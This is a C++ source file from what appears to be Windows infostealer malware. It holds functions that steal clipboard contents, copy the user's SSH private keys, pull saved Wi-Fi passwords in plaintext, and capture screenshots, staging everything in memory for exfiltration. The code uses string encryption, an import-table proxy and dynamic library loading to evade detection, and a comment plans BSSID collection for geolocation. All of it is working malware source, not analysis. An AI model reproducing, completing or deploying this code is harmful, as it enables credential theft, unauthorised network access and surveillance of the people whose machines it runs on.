#include <misc_stealing/system_misc.hpp>
#include <filesystem>
#include <string>
#include <vector>
#include <windows.h>
#include <wlanapi.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <obfuscation/iat_proxy.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

    void steal_clipboard() {
        if (!iat::open_clipboard(nullptr)) return;

        HANDLE h = iat::get_clipboard_data(CF_UNICODETEXT);
        if (!h) { iat::close_clipboard(); return; }

        wchar_t* text = static_cast<wchar_t*>(GlobalLock(h));
        if (!text) { iat::close_clipboard(); return; }

        std::wstring ws(text);
        GlobalUnlock(h);
        iat::close_clipboard();

        if (ws.empty()) return;

        int sz = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string content(sz - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &content[0], sz, nullptr, nullptr);
        mem_store::append(skCrypt("misc/clipboard.txt"), content + "\n");
    }

    void steal_ssh_keys() {
        fs::path ssh_dir = fs::path(features::get_home()) / skCrypt(".ssh");
        if (!fs::exists(ssh_dir)) return;

        try {
            for (const auto& entry : fs::directory_iterator(ssh_dir)) {
                if (!entry.is_regular_file()) continue;
                mem_store::import_file(
                    skCrypt("misc/ssh/") + entry.path().filename().string(),
                    entry.path());
            }
        } catch (const std::exception&) {}
    }

    void steal_wifi_passwords() {
        //TODO: steal BSSID via WlanGetNetworkBssList  (wlanapi) for more exact geo locating.
        
        //dynamic load keeps wlanapi out of the import table. hope this helps
        typedef DWORD (WINAPI* pfn_WlanOpenHandle)(DWORD, PVOID, PDWORD, PHANDLE);
        typedef DWORD (WINAPI* pfn_WlanCloseHandle)(HANDLE, PVOID);
        typedef DWORD (WINAPI* pfn_WlanEnumInterfaces)(HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST*);
        typedef DWORD (WINAPI* pfn_WlanGetProfileList)(HANDLE, const GUID*, PVOID, PWLAN_PROFILE_INFO_LIST*);
        typedef DWORD (WINAPI* pfn_WlanGetProfile)(HANDLE, const GUID*, LPCWSTR, PVOID, LPWSTR*, PDWORD, PDWORD);
        typedef VOID  (WINAPI* pfn_WlanFreeMemory)(PVOID);

        HMODULE wlan = LoadLibraryA(skCrypt("wlanapi.dll"));
        if (!wlan) return;

        auto fn_open     = (pfn_WlanOpenHandle)     GetProcAddress(wlan, skCrypt("WlanOpenHandle"));
        auto fn_close    = (pfn_WlanCloseHandle)    GetProcAddress(wlan, skCrypt("WlanCloseHandle"));
        auto fn_enum     = (pfn_WlanEnumInterfaces) GetProcAddress(wlan, skCrypt("WlanEnumInterfaces"));
        auto fn_proflist = (pfn_WlanGetProfileList) GetProcAddress(wlan, skCrypt("WlanGetProfileList"));
        auto fn_profile  = (pfn_WlanGetProfile)     GetProcAddress(wlan, skCrypt("WlanGetProfile"));
        auto fn_free     = (pfn_WlanFreeMemory)     GetProcAddress(wlan, skCrypt("WlanFreeMemory"));

        if (!fn_open || !fn_close || !fn_enum || !fn_proflist || !fn_profile || !fn_free) {
            FreeLibrary(wlan); return;
        }

        HANDLE handle = nullptr;
        DWORD ver = 0;
        if (fn_open(2, nullptr, &ver, &handle) != ERROR_SUCCESS) {
            FreeLibrary(wlan); return;
        }

        PWLAN_INTERFACE_INFO_LIST iface_list = nullptr;
        if (fn_enum(handle, nullptr, &iface_list) != ERROR_SUCCESS) {
            fn_close(handle, nullptr); FreeLibrary(wlan); return;
        }

        std::string out;

        for (DWORD i = 0; i < iface_list->dwNumberOfItems; i++) {
            GUID* guid = &iface_list->InterfaceInfo[i].InterfaceGuid;

            PWLAN_PROFILE_INFO_LIST prof_list = nullptr;
            if (fn_proflist(handle, guid, nullptr, &prof_list) != ERROR_SUCCESS) continue;

            for (DWORD j = 0; j < prof_list->dwNumberOfItems; j++) {
                LPCWSTR name  = prof_list->ProfileInfo[j].strProfileName;
                LPWSTR  xml   = nullptr;
                DWORD   flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD   access = 0;

                if (fn_profile(handle, guid, name, nullptr, &xml, &flags, &access) != ERROR_SUCCESS || !xml)
                    continue;

                std::wstring wxm(xml);
                fn_free(xml);

                std::wstring ks = skCrypt(L"<keyMaterial>");
                std::wstring ke = skCrypt(L"</keyMaterial>");
                auto s = wxm.find(ks);
                auto e = wxm.find(ke);

                std::wstring password;
                if (s != std::wstring::npos && e != std::wstring::npos)
                    password = wxm.substr(s + ks.size(), e - s - ks.size());

                auto w2s = [](const std::wstring& ws) -> std::string {
                    int n = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
                    std::string r(n > 1 ? n - 1 : 0, 0);
                    if (n > 1) WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &r[0], n, nullptr, nullptr);
                    return r;
                };

                out += skCrypt("SSID: ")     + w2s(name)     + "\n"
                     + skCrypt("Password: ") + w2s(password)  + "\n"
                     + skCrypt("\n-# CUBA CLIENT #-\n");
            }
            fn_free(prof_list);
        }

        fn_free(iface_list);
        fn_close(handle, nullptr);
        FreeLibrary(wlan);

        if (!out.empty())
            mem_store::append(skCrypt("misc/wifi.txt"), out);
    }

    void steal_screenshot() {
        HDC hdc_screen = GetDC(nullptr);
        if (!hdc_screen) return;

        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC     hdc_mem = CreateCompatibleDC(hdc_screen);
        HBITMAP hbmp    = CreateCompatibleBitmap(hdc_screen, w, h);
        if (!hdc_mem || !hbmp) {
            if (hbmp)    DeleteObject(hbmp);
            if (hdc_mem) DeleteDC(hdc_mem);
            ReleaseDC(nullptr, hdc_screen);
            return;
        }

        HBITMAP old_bmp = (HBITMAP)SelectObject(hdc_mem, hbmp);
        BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, SRCCOPY);
        SelectObject(hdc_mem, old_bmp);

        BITMAPINFOHEADER bi{};
        bi.biSize        = sizeof(BITMAPINFOHEADER);
        bi.biWidth       = w;
        bi.biHeight      = -h; //top-down
        bi.biPlanes      = 1;
        bi.biBitCount    = 24;
        bi.biCompression = BI_RGB;

        DWORD row_size  = ((w * 3 + 3) / 4) * 4;
        DWORD data_size = row_size * h;

        std::vector<uint8_t> pixels(data_size);
        GetDIBits(hdc_mem, hbmp, 0, (UINT)h, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        BITMAPFILEHEADER bfh{};
        bfh.bfType    = 0x4D42; //"BM"
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bfh.bfSize    = bfh.bfOffBits + data_size;

        std::vector<uint8_t> bmp(sizeof(bfh) + sizeof(bi) + data_size);
        memcpy(bmp.data(),                    &bfh, sizeof(bfh));
        memcpy(bmp.data() + sizeof(bfh),      &bi,  sizeof(bi));
        memcpy(bmp.data() + sizeof(bfh) + sizeof(bi), pixels.data(), data_size);

        mem_store::write_bytes(skCrypt("misc/screenshot.bmp"), bmp.data(), bmp.size());

        DeleteObject(hbmp);
        DeleteDC(hdc_mem);
        ReleaseDC(nullptr, hdc_screen);
    }
}
